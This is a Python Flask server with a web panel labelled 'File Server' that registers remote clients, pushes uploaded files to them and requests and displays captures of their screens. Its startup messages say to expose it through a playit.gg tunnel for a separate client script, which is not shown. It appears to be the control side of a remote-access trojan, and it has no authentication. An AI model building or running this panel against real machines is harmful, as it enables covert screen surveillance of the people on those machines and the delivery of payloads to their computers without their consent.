from flask import Flask, jsonify, render_template_string, request
import base64
from datetime import datetime
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.DEBUG)
active_clients = {}  # {client_id: {"name": client_name, "last_seen": timestamp, "file_to_download": {"filename": str, "content": str}, "screen_command": bool, "last_screen": str}}

# Регистрация клиента
@app.route("/api/register", methods=["POST"])
def register_client():
    try:
        data = request.get_json()
        client_id = data.get("client_id")
        client_name = data.get("client_name")
        if client_id and client_name:
            active_clients[client_id] = {
                "name": client_name,
                "last_seen": datetime.now(),
                "file_to_download": None,
                "screen_command": False,
                "last_screen": None
            }
            logging.debug(f"Registered client {client_id}: {client_name}")
            return jsonify({"status": "registered"}), 200
        return jsonify({"error": "Missing client_id or client_name"}), 400
    except Exception as e:
        logging.error(f"Registration error: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# Проверка статуса клиента и получение файла или команды
@app.route("/api/check/<client_id>", methods=["GET"])
def check_client(client_id):
    if client_id in active_clients:
        active_clients[client_id]["last_seen"] = datetime.now()
        file_to_download = active_clients[client_id].get("file_to_download")
        screen_command = active_clients[client_id].get("screen_command")
        last_screen = active_clients[client_id].get("last_screen")
        active_clients[client_id]["file_to_download"] = None
        return jsonify({"file": file_to_download, "screen_command": screen_command, "last_screen": last_screen})
    return jsonify({"error": "Client not found"}), 404

# Получить список активных клиентов
@app.route("/api/clients", methods=["GET"])
def get_clients():
    clients = [{"id": cid, "name": info["name"]} for cid, info in active_clients.items()]
    return jsonify(clients)

# Загрузка файла
@app.route("/api/upload", methods=["POST"])
def upload_file():
    if 'file' not in request.files:
        return jsonify({"error": "No file provided"}), 400
    client_id = request.form.get("client_id")
    if not client_id or client_id not in active_clients:
        return jsonify({"error": "Invalid or no client selected"}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No file selected"}), 400
    if file:
        filename = file.filename
        file_content = file.read()
        file_b64 = base64.b64encode(file_content).decode('utf-8')
        active_clients[client_id]["file_to_download"] = {
            "filename": filename,
            "content": file_b64
        }
        return jsonify({"status": "assigned", "filename": filename})
    return jsonify({"error": "Failed to upload file"}), 500

# Запрос скриншота
@app.route("/api/request_screen/<client_id>", methods=["POST"])
def request_screen(client_id):
    if client_id in active_clients:
        active_clients[client_id]["screen_command"] = True
        active_clients[client_id]["last_screen"] = None  # Сбрасываем предыдущий скриншот
        logging.debug(f"Requested screen capture for client {client_id}")
        return jsonify({"status": "screen capture requested"})
    return jsonify({"error": "Client not found"}), 404

# Получение скриншота
@app.route("/api/receive_screen/<client_id>", methods=["POST"])
def receive_screen(client_id):
    try:
        data = request.get_json()
        screen_b64 = data.get("screen")
        if client_id in active_clients and screen_b64:
            active_clients[client_id]["last_screen"] = screen_b64
            active_clients[client_id]["screen_command"] = False
            logging.debug(f"Received screen for client {client_id}, size: {len(screen_b64)} bytes")
            return jsonify({"status": "screen received"})
        return jsonify({"error": "Invalid data or client not found"}), 400
    except Exception as e:
        logging.error(f"Receive screen error for client {client_id}: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# Веб-интерфейс
@app.route("/")
def index():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>File Server</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-gray-100 flex justify-center items-center h-screen">
        <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
            <h1 class="text-2xl font-bold mb-4 text-center">File Server</h1>
            <div class="mb-4">
                <label for="client" class="block text-sm font-medium text-gray-700">Select Client</label>
                <select id="client" class="mt-1 block w-full p-2 border border-gray-300 rounded-md">
                    <option value="">-- Select Client --</option>
                </select>
            </div>
            <div class="mb-4">
                <label for="file-upload" class="block text-sm font-medium text-gray-700">Upload File</label>
                <input id="file-upload" type="file" class="mt-1 block w-full p-2 border border-gray-300 rounded-md">
            </div>
            <button id="send" class="w-full bg-blue-500 text-white p-2 rounded-md hover:bg-blue-600" disabled>
                Send File
            </button>
            <button id="view-screen" class="w-full bg-green-500 text-white p-2 rounded-md hover:bg-green-600 mt-2" disabled>
                View Screen
            </button>
        </div>
        <!-- Модальное окно для просмотра экрана -->
        <div id="screenModal" class="fixed inset-0 bg-black bg-opacity-50 hidden flex items-center justify-center">
            <div class="bg-white p-4 rounded-lg max-w-5xl w-full max-h-screen overflow-y-auto">
                <h2 class="text-xl font-bold mb-4">Screen View</h2>
                <img id="screenImage" class="w-full h-auto object-contain" src="" alt="Client Screen">
                <p id="screenStatus" class="mt-2 text-sm text-gray-600">Waiting for screen...</p>
                <button id="refreshScreen" class="mt-2 w-32 bg-blue-500 text-white p-2 rounded-md hover:bg-blue-600">Refresh</button>
                <button id="closeModal" class="mt-2 w-32 bg-red-500 text-white p-2 rounded-md hover:bg-red-600">Close</button>
            </div>
        </div>
        <script>
            const clientSelect = document.getElementById('client');
            const uploadInput = document.getElementById('file-upload');
            const sendBtn = document.getElementById('send');
            const viewScreenBtn = document.getElementById('view-screen');
            const screenModal = document.getElementById('screenModal');
            const screenImage = document.getElementById('screenImage');
            const screenStatus = document.getElementById('screenStatus');
            const closeModal = document.getElementById('closeModal');
            const refreshScreenBtn = document.getElementById('refreshScreen');
            let screenInterval = null;

            function loadClients() {
                const currentClient = clientSelect.value;
                fetch('/api/clients')
                    .then(res => res.json())
                    .then(clients => {
                        clientSelect.innerHTML = '<option value="">-- Select Client --</option>';
                        clients.forEach(client => {
                            const option = document.createElement('option');
                            option.value = client.id;
                            option.textContent = client.name;
                            clientSelect.appendChild(option);
                        });
                        if (currentClient && clients.some(c => c.id === currentClient)) {
                            clientSelect.value = currentClient;
                        }
                        sendBtn.disabled = !clientSelect.value || !uploadInput.files[0];
                        viewScreenBtn.disabled = !clientSelect.value;
                    });
            }
            loadClients();
            setInterval(loadClients, 5000);

            clientSelect.addEventListener('change', () => {
                sendBtn.disabled = !clientSelect.value || !uploadInput.files[0];
                viewScreenBtn.disabled = !clientSelect.value;
            });
            uploadInput.addEventListener('change', () => {
                sendBtn.disabled = !clientSelect.value || !uploadInput.files[0];
            });

            sendBtn.addEventListener('click', () => {
                const clientId = clientSelect.value;
                const file = uploadInput.files[0];
                if (!clientId || !file) {
                    alert('Please select a client and a file');
                    return;
                }
                const formData = new FormData();
                formData.append('file', file);
                formData.append('client_id', clientId);
                fetch('/api/upload', {
                    method: 'POST',
                    body: formData
                })
                    .then(res => res.json())
                    .then(data => {
                        if (data.status === 'assigned') {
                            alert(`File "${data.filename}" assigned to client!`);
                            uploadInput.value = '';
                            sendBtn.disabled = true;
                        } else {
                            alert('Error: ' + data.error);
                        }
                    });
            });

            viewScreenBtn.addEventListener('click', () => {
                const clientId = clientSelect.value;
                if (!clientId) {
                    alert('Please select a client');
                    return;
                }
                fetch(`/api/request_screen/${clientId}`, { method: 'POST' })
                    .then(res => res.json())
                    .then(data => {
                        if (data.status === 'screen capture requested') {
                            screenModal.classList.remove('hidden');
                            screenStatus.textContent = 'Waiting for screen...';
                            let timeout = 0;
                            screenInterval = setInterval(() => {
                                fetch(`/api/check/${clientId}`)
                                    .then(res => res.json())
                                    .then(data => {
                                        if (data.last_screen) {
                                            screenImage.src = `data:image/png;base64,${data.last_screen}`;
                                            screenStatus.textContent = 'Screen received';
                                            clearInterval(screenInterval);
                                        } else if (timeout > 10) { // Таймаут 10 секунд
                                            screenStatus.textContent = 'Timeout: Screen not received';
                                            clearInterval(screenInterval);
                                        }
                                        timeout++;
                                    })
                                    .catch(err => {
                                        screenStatus.textContent = `Error: ${err.message}`;
                                        clearInterval(screenInterval);
                                    });
                            }, 1000); // Проверка каждую секунду
                        } else {
                            alert('Error: ' + data.error);
                        }
                    });
            });

            refreshScreenBtn.addEventListener('click', () => {
                const clientId = clientSelect.value;
                if (!clientId) {
                    alert('Please select a client');
                    return;
                }
                screenStatus.textContent = 'Waiting for new screen...';
                fetch(`/api/request_screen/${clientId}`, { method: 'POST' })
                    .then(res => res.json())
                    .then(data => {
                        if (data.status === 'screen capture requested') {
                            let timeout = 0;
                            if (screenInterval) clearInterval(screenInterval);
                            screenInterval = setInterval(() => {
                                fetch(`/api/check/${clientId}`)
                                    .then(res => res.json())
                                    .then(data => {
                                        if (data.last_screen) {
                                            screenImage.src = `data:image/png;base64,${data.last_screen}`;
                                            screenStatus.textContent = 'Screen received';
                                            clearInterval(screenInterval);
                                        } else if (timeout > 10) { // Таймаут 10 секунд
                                            screenStatus.textContent = 'Timeout: Screen not received';
                                            clearInterval(screenInterval);
                                        }
                                        timeout++;
                                    })
                                    .catch(err => {
                                        screenStatus.textContent = `Error: ${err.message}`;
                                        clearInterval(screenInterval);
                                    });
                            }, 1000); // Проверка каждую секунду
                        } else {
                            alert('Error: ' + data.error);
                        }
                    });
            });

            closeModal.addEventListener('click', () => {
                screenModal.classList.add('hidden');
                if (screenInterval) {
                    clearInterval(screenInterval);
                    screenInterval = null;
                }
                screenStatus.textContent = 'Waiting for screen...';
            });
        </script>
    </body>
    </html>
    """)

if __name__ == "__main__":
    print("Starting Flask server on port 5000...")
    print("Please run the playit.gg agent and create a TCP tunnel for port 5000.")
    print("Use the playit.gg tunnel address (e.g., http://main-nike.gl.at.ply.gg:54943) in client.py as SERVER_URL.")
    app.run(port=5000)
